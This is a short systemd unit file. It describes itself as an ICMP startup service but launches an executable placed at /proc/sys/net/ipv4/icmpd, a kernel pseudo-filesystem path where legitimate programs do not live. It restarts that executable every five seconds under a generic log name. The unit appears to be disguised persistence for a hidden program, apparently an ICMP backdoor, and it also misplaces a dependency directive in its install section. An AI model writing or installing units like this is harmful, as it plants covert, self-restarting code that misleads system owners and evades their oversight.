[Unit]
Description=Contains service information for ICMP service on startup.

[Install]
WantedBy=multi-user.target
After=network.target

[Service]
Type=simple
ExecStart=/proc/sys/net/ipv4/icmpd
WorkingDirectory=/proc/sys/net/ipv4/
Restart=always
RestartSec=5
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=%n